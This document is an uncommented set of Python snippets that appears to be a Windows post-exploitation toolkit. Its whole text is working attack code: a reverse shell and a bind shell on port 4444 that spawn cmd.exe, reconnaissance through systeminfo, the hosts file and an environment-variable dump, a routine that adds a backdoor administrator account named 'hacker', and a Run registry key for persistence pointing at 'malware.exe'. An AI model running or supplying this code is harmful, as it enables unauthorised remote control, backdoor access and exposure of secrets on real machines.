import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["cmd.exe"])
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["cmd.exe"])
import os
os.system("systeminfo")
import ctypes,os
if ctypes.windll.shell32.IsUserAnAdmin() != 0:
    os.system("net user hacker Pass123! /add")
    os.system("net localgroup administrators hacker /add")
    print("User added")
else:
    print("Not admin")
with open("C:\\Windows\\System32\\drivers\\etc\\hosts","r") as f:
    print(f.read())
import winreg
key = winreg.HKEY_CURRENT_USER
key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
key_open = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key_open, "Malware", 0, winreg.REG_SZ, "C:\\malware.exe")
winreg.CloseKey(key_open)
print("Registry key added")
import os
for k,v in os.environ.items():
    print(f"{k}={v}")